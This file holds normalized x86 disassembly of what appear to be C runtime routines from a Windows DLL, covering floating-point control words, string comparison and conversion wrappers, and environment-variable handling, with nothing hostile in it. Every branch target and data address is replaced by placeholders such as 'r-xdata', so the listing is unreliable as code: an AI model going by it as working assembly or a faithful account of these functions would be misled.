mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_1003dba5
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_1003dc33
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_1003dcd3
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_1003dba5
movzx eax ax
mov [ ebp - 0x4 ] eax
fldcw [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_1003dc33
push eax
mov [ ebp - 0xc ] eax
call sub_1003e404
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_1003dfe2
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] 0x404e
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
cmp [ ebp + 0xc ] esi
jbe r-xdata
cmp [ eax + 0x8 ] esi
je r-xdata
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx edx
shr ecx 0x1f
lea edi [ edx + edx ]
lea edx [ ebx + ebx ]
or edx ecx
mov ecx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
add ecx ecx
or ecx esi
mov [ ebp - 0x14 ] edi
mov esi edi
and [ ebp - 0x14 ] 0x0
mov ebx edx
shr ebx 0x1f
add ecx ecx
shr edi 0x1f
or ecx ebx
mov ebx [ ebp - 0x10 ]
add esi esi
add edx edx
or edx edi
lea edi [ esi + ebx ]
mov [ eax ] esi
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
cmp edi esi
jb r-xdata
mov ecx [ eax + 0x4 ]
mov edx ecx
shr edx 0x10
mov [ eax + 0x8 ] edx
mov edx [ eax ]
mov edi edx
shl ecx 0x10
shr edi 0x10
or ecx edi
shl edx 0x10
add [ ebp - 0x18 ] 0xfff0
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
mov ebx 0x8000
test [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp - 0x14 ] 0x1
cmp edi ebx
jae r-xdata
mov cx [ ebp - 0x18 ]
mov [ eax + 0xa ] cx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
mov esi [ eax ]
mov edi [ eax + 0x4 ]
add [ ebp - 0x18 ] 0xffff
mov ecx esi
add esi esi
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
add ecx ecx
or ecx edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
test ebx ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea ebx [ ecx + edx ]
xor esi esi
cmp ebx ecx
jb r-xdata
lea esi [ edx + 0x1 ]
cmp esi edx
jb r-xdata
xor ebx ebx
mov [ eax ] edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
xor esi esi
inc esi
cmp ebx edx
jae r-xdata
xor ebx ebx
inc ebx
cmp esi 0x1
jae r-xdata
mov ecx [ ebp - 0x8 ]
add [ eax + 0x8 ] ecx
and [ ebp - 0x14 ] 0x0
lea ecx [ edi + edi ]
mov edx edi
shr edx 0x1f
lea edi [ ebx + ebx ]
or edi edx
mov edx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
lea ebx [ edx + edx ]
mov edx [ ebp + 0x8 ]
or ebx esi
mov [ eax ] ecx
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ebx
movsx edx [ edx ]
lea esi [ ecx + edx ]
mov [ ebp - 0x10 ] edx
cmp esi ecx
jb r-xdata
inc [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
test esi esi
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] esi
test ebx ebx
je r-xdata
mov [ ebp - 0x14 ] 0x1
cmp esi edx
jae r-xdata
dec [ ebp + 0xc ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
ja r-xdata
lea ecx [ edi + 0x1 ]
xor edx edx
cmp ecx edi
jb r-xdata
cmp [ ebp - 0x14 ] 0x0
mov [ eax ] esi
je r-xdata
xor esi esi
jmp r-xdata
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
inc ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x4 ] ecx
test edx edx
je r-xdata
sub_1003e1b0
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
mov ecx eax
sub esp 0x14
cmp [ ebp + 0x8 ] cx
je r-xdata
leave
retn
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_1002a8c8
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x14 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
push esi
mov eax 0x100
mov esi eax
cmp [ ebp + 0x8 ] si
pop esi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
push [ ecx + 0x4 ]
lea ecx [ ebp - 0x4 ]
push 0x1
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
push edx
lea eax [ ebp - 0x14 ]
push eax
call sub_1002e0ff
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_1003ab5d
add esp 0xc
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
movzx eax ax
jmp r-xdata
add eax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0xcc ]
movzx ax [ ecx + eax ]
jmp r-xdata
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1003e265
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
mov ecx [ ebp + 0x10 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp ecx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
jmp r-xdata
push [ eax + 0x4 ]
push ecx
push [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
push 0x1001
push [ eax + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003e804
add esp 0x20
cmp eax ebx
jne r-xdata
push [ ebp + 0x14 ]
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003e846
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1003e36d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
push edi
mov edi [ rw-data ]
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
cmp eax esi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
call sub_1002ddf5
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push [ ebp - 0x8 ]
push eax
push 0xffffffff
push [ edi ]
push esi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_10027a85
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_1003e9ec
pop ecx
pop ecx
test eax eax
jge r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push eax
push esi
push esi
call ebx
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
push [ ebp - 0x4 ]
call sub_10027a85
pop ecx
mov [ ebp - 0x4 ] esi
sub_1003e404
push 0x8
push r--data
call sub_1002fdfc
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_1002fe41
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_1003e476
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
jne r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
dec ecx
mov eax [ ebp + 0x8 ]
sub eax ecx
dec eax
pop ebp
retn
inc eax
sub_1003e494
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
push esi
push edi
xor edi edi
mov ebx edx
mov esi ecx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
push 0x1
mov eax r--data
push eax
push 0x1
push eax
push edi
push edi
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0xffffffff
jge r-xdata
push [ ebp + 0x10 ]
mov eax ebx
call sub_1003e476
pop ecx
mov [ ebp + 0x10 ] eax
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov edx [ ebp + 0x18 ]
cmp edx edi
jle r-xdata
xor eax eax
jmp r-xdata
cmp edx 0xffffffff
jl r-xdata
mov eax [ ebp - 0x1c ]
push edx
call sub_1003e476
mov edx eax
pop ecx
mov [ ebp + 0x18 ] edx
jmp r-xdata
mov [ rw-data ] 0x2
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10027150
leave
retn
mov ecx [ rw-data ]
cmp ecx 0x2
je r-xdata
xor edi edi
xor ebx ebx
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp ecx edi
je r-xdata
cmp [ ebp + 0x1c ] edi
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
xor eax eax
inc eax
cmp ecx eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_100373d0
mov esi eax
pop ecx
cmp esi 0xffffffff
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov [ ebp - 0x28 ] edi
cmp [ ebp + 0x1c ] edi
jne r-xdata
cmp esi [ ebp + 0x1c ]
je r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov [ ebp + 0x1c ] ecx
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
mov esi eax
test ebx ebx
je r-xdata
push 0x0
push 0x0
lea eax [ ebp + 0x10 ]
push eax
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x1c ]
call sub_10037419
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
cmp edx edi
jne r-xdata
mov eax esi
push ebx
call sub_10027a85
push edi
call sub_10027a85
pop ecx
pop ecx
push 0x0
push 0x0
lea eax [ ebp + 0x18 ]
push eax
push [ ebp - 0x1c ]
push esi
push [ ebp + 0x1c ]
call sub_10037419
mov edi eax
add esp 0x18
test edi edi
jne r-xdata
cmp edx eax
jg r-xdata
push 0x2
mov esi [ MultiByteToWideChar@IAT ]
push edi
push edi
push [ ebp + 0x10 ]
push ebx
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
cmp ebx edi
je r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] edi
push ebx
call sub_10027a85
pop ecx
jmp r-xdata
cmp [ ebp + 0x10 ] eax
jle r-xdata
mov edi 0x400
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x1c ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
and [ ebp - 0x20 ] 0x0
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp + 0x10 ] edi
jle r-xdata
pop eax
jmp r-xdata
push ebx
push [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
cmp [ ebp + 0x18 ] edi
jle r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
push [ ebp - 0x20 ]
call sub_1002d97d
mov eax [ ebp - 0x28 ]
pop ecx
jmp r-xdata
push 0x0
push 0x0
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push eax
call sub_1002a4a4
pop ecx
test eax eax
je r-xdata
call sub_100375d0
mov eax esp
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x2
jae r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
jle r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add eax 0x8
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
mov cl [ ebx ]
cmp cl [ eax ]
jb r-xdata
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
mov ecx [ ebp - 0x1c ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
push edi
call sub_1002d97d
pop ecx
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x20 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
mov [ ebp - 0x28 ] eax
push eax
call sub_1002a4a4
pop ecx
test eax eax
je r-xdata
call sub_100375d0
mov edi esp
test edi edi
je r-xdata
inc eax
inc eax
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
sub_1003e804
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
push [ ebp + 0x24 ]
mov edx [ ebp + 0x14 ]
push [ ebp + 0x20 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1003e494
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1003e846
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
mov edx [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp edx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
jne r-xdata
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
jmp r-xdata
push [ eax + 0x8 ]
lea eax [ ebp - 0x10 ]
push edx
push [ ebp + 0xc ]
push edx
push [ ebp + 0x8 ]
push 0x1001
push ecx
push eax
call sub_1003e804
add esp 0x20
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003aa0d
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
call sub_1002d4db
mov [ eax ] 0x16
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1003e940
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_1003e353
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
add esi 0x4
mov eax [ esi ]
mov al [ edi + eax ]
cmp al 0x3d
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop esi
pop ebp
retn
sub_1003e992
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov ecx edi
test edi edi
je r-xdata
pop edi
leave
retn
cmp [ edi ] eax
je r-xdata
push esi
inc eax
push 0x4
push eax
call sub_1002ddf5
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
jne r-xdata
add ecx 0x4
inc eax
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ edi ]
test eax eax
jne r-xdata
push 0x9
call sub_1002ab7b
jmp r-xdata
push eax
call sub_1003ec37
mov [ esi ] eax
add esi 0x4
add edi 0x4
and [ esi ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ecx
sub_1003e9ec
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
mov [ ebp - 0xc ] ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ eax ]
push edi
mov [ ebp - 0x4 ] esi
cmp esi ebx
je r-xdata
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_1002d4db
mov [ eax ] 0x16
push 0x3d
push esi
call sub_1003ed48
mov edi eax
pop ecx
pop ecx
mov [ ebp - 0x14 ] edi
cmp edi ebx
je r-xdata
pop ebx
leave
retn
cmp esi edi
je r-xdata
xor eax eax
cmp [ edi + 0x1 ] bl
sete al
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
cmp eax ebx
jne r-xdata
call sub_1003e992
mov [ rw-data ] eax
mov esi [ rw-data ]
mov [ ebp - 0x10 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
or eax 0xffffffff
sub edi [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_1003e940
mov edi eax
cmp edi ebx
pop ecx
jl r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
call sub_1002ddb0
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
call sub_1003e36d
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_10027a85
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
cmp edi ebx
jge r-xdata
lea esi [ esi + edi * 4 ]
push [ esi ]
call sub_10027a85
pop ecx
cmp [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
pop esi
mov [ eax ] ebx
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ edi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
cmp [ esi ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
push 0x4
call sub_1002ddb0
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
cmp eax 0x3fffffff
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ ebp - 0x10 ]
inc edi
lea esi [ eax + edi * 4 ]
cmp edi 0x3fffffff
jae r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov [ eax ] ebx
push eax
push 0x4
push [ rw-data ]
call sub_1002de8f
add esp 0xc
cmp eax ebx
je r-xdata
push 0x4
push edi
push [ rw-data ]
call sub_1002de8f
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov esi [ ebp - 0x4 ]
push 0x1
push esi
call sub_10027160
inc eax
pop ecx
inc eax
push eax
call sub_1002ddf5
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea ecx [ eax + edi * 4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
